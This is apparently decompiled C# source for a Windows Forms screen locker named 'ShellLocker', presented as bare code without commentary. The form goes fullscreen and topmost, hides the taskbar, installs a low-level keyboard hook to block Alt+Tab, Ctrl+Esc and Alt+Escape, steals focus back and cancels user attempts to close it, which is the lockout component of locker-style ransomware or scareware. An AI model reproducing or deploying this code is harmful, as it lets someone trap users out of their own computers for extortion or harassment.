#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ShellLocker;

[DesignerGenerated]
public class Form2 : Form
{
	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	public delegate int KeyboardHookDelegate(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam);

	private IContainer components;

	private const int HC_ACTION = 0;

	private const int LLKHF_EXTENDED = 1;

	private const int LLKHF_INJECTED = 16;

	private const int LLKHF_ALTDOWN = 32;

	private const int LLKHF_UP = 128;

	public const int VK_TAB = 9;

	public const int VK_CONTROL = 17;

	public const int VK_ESCAPE = 27;

	public const int VK_DELETE = 46;

	public const int VK_MENU = 18;

	private const int WH_KEYBOARD_LL = 13;

	public int KeyboardHandle;

	[MarshalAs(UnmanagedType.FunctionPtr)]
	private KeyboardHookDelegate callback;

	public const int VK_LWIN = 91;

	public const int KEYEVENTF_KEYUP = 2;

	private int i;

	private int i2;

	private int i3;

	private int i4;

	private int i5;

	private string Location;

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	private RichTextBox erhaltenerText;

	private string path1;

	private string path2;

	private object userDir;

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public Form2()
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		((Control)this).add_LostFocus((EventHandler)Form2_LostFocus);
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		Timer1 = new Timer(components);
		PictureBox1 = new PictureBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1);
		((Control)PictureBox1).set_Location(new Point(11, -11));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(10, 10));
		PictureBox1.set_TabIndex(18);
		PictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(1302, 710));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("User32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, int wFlags);

	public void TaskBarVisible(bool Visible)
	{
		string lpClassName = "Shell_TrayWnd";
		string lpWindowName = "";
		int hWnd = FindWindow(ref lpClassName, ref lpWindowName);
		if (Visible)
		{
			SetWindowPos(hWnd, 0, 0, 0, 0, 0, 64);
		}
		else
		{
			SetWindowPos(hWnd, 0, 0, 0, 0, 0, 128);
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState2(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

	public bool IsHooked(ref KBDLLHOOKSTRUCT Hookstruct)
	{
		if ((Hookstruct.vkCode == 27) & ((GetAsyncKeyState(17) & 0x8000) != 0))
		{
			HookedState("Ctrl + Esc blocked");
			return true;
		}
		if ((Hookstruct.vkCode == 9) & ((Hookstruct.flags & 0x20) != 0))
		{
			HookedState("Alt + Tab blockd");
			return true;
		}
		if ((Hookstruct.vkCode == 27) & ((Hookstruct.flags & 0x20) != 0))
		{
			HookedState("Alt + Escape blocked");
			return true;
		}
		return false;
	}

	private void HookedState(string Text)
	{
		Debug.WriteLine(Text);
	}

	public int KeyboardCallback(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		if (Code == 0)
		{
			Debug.WriteLine("Calling IsHooked");
			if (IsHooked(ref lParam))
			{
				return 1;
			}
		}
		return CallNextHookEx(KeyboardHandle, Code, wParam, lParam);
	}

	public void HookKeyboard()
	{
		callback = KeyboardCallback;
		KeyboardHandle = SetWindowsHookExA(13, callback, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		CheckHooked();
	}

	public void CheckHooked()
	{
		if (Conversions.ToBoolean(Hooked()))
		{
			Debug.WriteLine("Keyboard hooked");
		}
		else
		{
			Debug.WriteLine("Keyboard hook failed: " + Conversions.ToString(Information.Err().get_LastDllError()));
		}
	}

	private object Hooked()
	{
		return KeyboardHandle != 0;
	}

	public void UnhookKeyboard()
	{
		if (Conversions.ToBoolean(Hooked()))
		{
			UnhookWindowsHookEx(KeyboardHandle);
		}
	}

	private void Form2_LostFocus(object sender, EventArgs e)
	{
		((Control)this).Focus();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vkey);

	private void Form2_Load(object sender, EventArgs e)
	{
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		((Control)this).BringToFront();
	}
}
